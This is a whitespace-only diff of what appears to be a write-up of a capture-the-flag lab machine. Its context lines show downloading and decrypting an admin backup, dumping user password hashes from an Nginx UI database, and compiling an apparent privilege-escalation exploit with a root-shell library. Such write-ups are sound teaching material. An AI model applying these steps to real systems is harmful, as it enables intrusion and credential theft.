@@ -73,7 +73,7 @@ admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duratio
 Let's add that to hosts file.
 
 ```bash
-kali@kali:cat /etc/hosts                                                                                                                                           
+kali@kali:cat /etc/hosts
 10.129.242.233  snapped.htb admin.snapped.htb
 
 127.0.0.1       localhost
@@ -206,10 +206,10 @@ kali@kali:curl -OJ -v http://admin.snapped.htb/api/backup
 ```
 
 ```bash
-kali@kali:unzip backup-20260324-033444.zip                                                                                                                         
+kali@kali:unzip backup-20260324-033444.zip
 Archive:  backup-20260324-033444.zip
-  inflating: hash_info.txt           
-  inflating: nginx-ui.zip            
+  inflating: hash_info.txt
+  inflating: nginx-ui.zip
   inflating: nginx.zip
 ```
 
@@ -224,25 +224,25 @@ kali@kali:openssl enc -aes-256-cbc -d -in nginx-ui.zip -out nginxui_decrypted.zi
 Now, let's extract the secrets of the Nginx UI.
 
 ```bash
-kali@kali:unzip nginxui_decrypted.zip                                                                                                                              
+kali@kali:unzip nginxui_decrypted.zip
 Archive:  nginxui_decrypted.zip
-  inflating: app.ini                 
+  inflating: app.ini
   inflating: database.db
 ```
 
 We have a database file. Let's read the contents of it.
 
 ```bash
-kali@kali:sqlite3 database.db                                                                                                                                      
+kali@kali:sqlite3 database.db
 SQLite version 3.46.1 2024-08-13 09:16:08
 Enter ".help" for usage hints.
 sqlite> .tables
-acme_users         configs            namespaces         sites            
-auth_tokens        dns_credentials    nginx_log_indices  streams          
-auto_backups       dns_domains        nodes              upstream_configs 
-ban_ips            external_notifies  notifications      users            
-certs              llm_sessions       passkeys         
-config_backups     migrations         site_configs     
+acme_users         configs            namespaces         sites
+auth_tokens        dns_credentials    nginx_log_indices  streams
+auto_backups       dns_domains        nodes              upstream_configs
+ban_ips            external_notifies  notifications      users
+certs              llm_sessions       passkeys
+config_backups     migrations         site_configs
 sqlite> select * from users;
 1|2026-03-19 08:22:54.41011219-04:00|2026-03-19 08:39:11.562741743-04:00||admin|$2a$10$8.....VltEvm|1||
 ...
@@ -592,8 +592,7 @@ void _start(void) {
 Now, compile it and send the compiled binaries to over the target machine.
 
 ```bash
-kali@kali:gcc -O2 -static -o firefox_2404 firefox_2404.c                                                                                                           
-
+kali@kali:gcc -O2 -static -o firefox_2404 firefox_2404.c
 kali@kali:gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c
 ```
 
